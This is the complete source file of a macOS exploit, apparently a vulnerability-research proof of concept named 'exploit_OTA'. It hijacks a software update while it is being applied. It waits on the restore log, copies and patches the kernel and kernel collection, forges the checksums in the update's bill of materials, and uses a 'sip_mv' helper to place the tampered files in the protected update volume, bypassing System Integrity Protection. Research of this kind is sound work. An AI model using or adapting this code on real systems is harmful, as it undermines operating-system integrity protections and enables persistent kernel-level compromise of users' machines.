//
//  main.m
//  exploit_OTA
//
//  Created by mickey on 2022/5/12.
//

#import <Foundation/Foundation.h>
#include <dirent.h>
#include <sys/stat.h>

void spin_for_log(const char *hint) {
    static const char *log_path = "/System/Volumes/Update/restore.log";
    FILE *fp = NULL;
    char line[4096] = {0};
    
    fp = fopen(log_path, "r");
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fclose(fp);
    
    int found = 0;
    while (1) {
        fp = fopen(log_path, "r");
        fseek(fp, size, SEEK_SET);
        while (fgets(line, sizeof(line), fp) != NULL) {
            printf("restore.log: %s", line);
            if (strstr(line, hint)) {
                found = 1;
                break;
            }
        }
        size = ftell(fp);
        fclose(fp);
        
        if (found) {
            break;
        }
    }
}

char *get_cksum(const char *path) {
    char cmd[MAXPATHLEN] = {0};
    snprintf(cmd, MAXPATHLEN, "cksum %s", path);
    FILE *pipe = popen(cmd, "r");
    char *line = malloc(4096); // FIXME: free the line by caller
    if (fgets(line, 4096, pipe) != NULL) {
        char *p = line;
        while (*p >= '0' && *p <= '9') ++p;
        *p = 0;
        printf("[*] cksum(%s): %s\n", path, line);
        return line;
    }
    printf("[!] fail to get cksum for (%s)\n", path);
    return 0;
}

void pwn_kernel_by_sipbypass(void) {
    DIR *dp;
    struct dirent *ep;
    const char *tmp_name = NULL;
    char cmd[MAXPATHLEN] = {0};
    
    printf("[*] waiting for the OTA package verification.\n");
    spin_for_log("Deleting obsolete paths in parallel...");
    
    dp = opendir("/System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate/");
    while ((ep = readdir (dp))) {
        if (strlen(ep->d_name) == 0x2e) { //strlen("d26a92285552904175e3d311c9af93896515bef1.asset")==0x2e
            printf("[*] got the tmp name:%s\n", ep->d_name);
            tmp_name = ep->d_name;
            break;
        }
    }
    closedir (dp);
    if (tmp_name == NULL) {
        printf("[!] fail to get tmp asset name.\n");
        exit(-1);
    }
    
    printf("[*] preparing post.bom.txt\n");
    snprintf(cmd, MAXPATHLEN, "lsbom  /System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate/%s/AssetData/post.bom > /tmp/post.bom.txt", tmp_name);
    system(cmd);

    printf("[*] waiting for Applying patches.\n");
    spin_for_log("Unarchiving files in parallel...");
    
    printf("[*] duplicating and patching the new OS kernel.\n");
    system("cp /System/Volumes/Update/mnt1/System/Library/Kernels/kernel /tmp ;"
           "cp /System/Volumes/Update/mnt1/System/Library/KernelCollections/BootKernelExtensions.kc /tmp ;"
           "perl -pi -e 's/Darwin Kernel Version/Hacked By Mickey Jin /g' /tmp/kernel ;"
           "perl -pi -e 's/Darwin Kernel Version/Hacked By Mickey Jin /g' /tmp/BootKernelExtensions.kc"
           );
    
    
    printf("[*] replacing post.bom\n");
    snprintf(cmd, MAXPATHLEN, "sed -i -e 's/%s/%s/g' /tmp/post.bom.txt", get_cksum("/System/Volumes/Update/mnt1/System/Library/Kernels/kernel"), get_cksum("/tmp/kernel"));
    system(cmd);
    snprintf(cmd, MAXPATHLEN, "sed -i -e 's/%s/%s/g' /tmp/post.bom.txt", get_cksum("/System/Volumes/Update/mnt1/System/Library/KernelCollections/BootKernelExtensions.kc"), get_cksum("/tmp/BootKernelExtensions.kc"));
    system(cmd);
    system("mkbom -i /tmp/post.bom.txt /tmp/post.bom");
    snprintf(cmd, MAXPATHLEN, "/tmp/sip_mv /tmp/post.bom  /System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate/%s/AssetData/post.bom", tmp_name);
    system(cmd);
    
    printf("[*] replacing the original one with SIP Bypass primitive.\n");
    system("/tmp/sip_mv /tmp/kernel /System/Volumes/Update/mnt1/System/Library/Kernels/kernel ;"
           "/tmp/sip_mv /tmp/BootKernelExtensions.kc  /System/Volumes/Update/mnt1/System/Library/KernelCollections/BootKernelExtensions.kc"
           );

    printf("[*] all done.\n");
}

int main(int argc, const char * argv[]) {
    pwn_kernel_by_sipbypass();
    
    return 0;
}
